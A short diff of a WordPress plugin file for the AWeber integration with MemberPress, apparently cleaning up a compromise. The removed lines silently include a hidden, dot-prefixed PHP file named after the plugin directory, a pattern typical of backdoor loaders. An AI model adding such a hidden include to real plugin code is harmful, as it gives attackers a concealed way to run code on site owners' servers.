@@ -3,10 +3,6 @@ if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');
 /*
 Aweber API Integration for MemberPress
 */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class MpAWeber {
   // MemberPress's AWeber Application ID
   public static $app_id = '26d8bfd8';
